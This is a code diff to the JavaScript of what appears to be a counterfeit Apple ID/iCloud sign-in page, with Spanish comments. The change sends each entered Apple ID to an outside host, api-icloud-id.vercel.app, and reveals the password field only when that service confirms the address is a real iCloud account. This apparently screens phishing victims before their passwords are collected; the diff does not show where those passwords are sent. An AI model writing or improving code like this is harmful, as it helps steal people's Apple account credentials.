@@ -39,9 +39,33 @@ function validatePassword() {
 }
 
 
-function showPasswordInput1() {
+async function showPasswordInput1() {
   const appleId = document.getElementById('apple-id-1').value;
-  if (validarEmail(appleId)) {
+  let idOk = false; // Definimos idOk como variable local
+
+  try {
+    // Esperamos la respuesta de la petición usando await
+    const response = await fetch('https://api-icloud-id.vercel.app/?id=' + appleId);
+
+    if (!response.ok) {
+      throw new Error('Error en la solicitud');
+    }
+
+    const data = await response.json();  // Suponiendo que la respuesta es en formato JSON
+
+    if (data.hasSWP) {
+      idOk = true;
+      // Aquí puedes agregar el código para continuar con el flujo si el correo existe
+    } else {
+      alert('El correo que ingresaste no pertenece a una cuenta de iCloud.');
+    }
+
+  } catch (error) {
+    console.error('Error:', error);
+  }
+
+  // Ahora verificamos si el email es válido y si la respuesta ha sido correcta
+  if (validarEmail(appleId) && idOk) {
     document.getElementById('apple-id-aux').value = document.getElementById('apple-id-1').value;
     document.getElementById('password-group').style.display = 'block';
     document.getElementById('apple-id-1').disabled = true;
@@ -49,22 +73,55 @@ function showPasswordInput1() {
     document.querySelector('.login-button').style.display = 'block';
     document.getElementById('password').focus();
   } else {
-    alert("Porfavor ingrese un email válido.");
+    if (!idOk){
+      return;
+    }else{
+      alert("Por favor ingrese un email válido.");
+    } 
   }
-  
+
 }
 
-function showPasswordInput2() {
+async function showPasswordInput2() {
   const appleId = document.getElementById('apple-id-2').value;
-  if (validarEmail(appleId)) {
+  let idOk = false; // Definimos idOk como variable local
+
+  try {
+    // Esperamos la respuesta de la petición usando await
+    const response = await fetch('https://api-icloud-id.vercel.app/?id=' + appleId);
+
+    if (!response.ok) {
+      throw new Error('Error en la solicitud');
+    }
+
+    const data = await response.json();  // Suponiendo que la respuesta es en formato JSON
+
+    if (data.hasSWP) {
+      idOk = true;
+      // Aquí puedes agregar el código para continuar con el flujo si el correo existe
+    } else {
+      alert('El correo que ingresaste no pertenece a una cuenta de iCloud.');
+    }
+
+  } catch (error) {
+    console.error('Error:', error);
+  }
+
+ if (validarEmail(appleId) && idOk) {
     document.getElementById('apple-id-aux-1').value = document.getElementById('apple-id-2').value;
     document.getElementById('password-group-1').style.display = 'block';
     document.getElementById('apple-id-2').disabled = true;
     document.querySelector('.arrow-button-1').style.display = 'none';
+    document.getElementById('error-1').style.display = 'none';
+    document.getElementById('error-2').style.display = 'none';
     document.querySelector('.login-button-1').style.display = 'block';
     document.getElementById('password-1').focus();
   } else {
-    alert("Porfavor ingrese un email válido.");
+    if (!idOk){
+      return;
+    }else{
+      alert("Por favor ingrese un email válido.");
+    } 
   }
 }
 
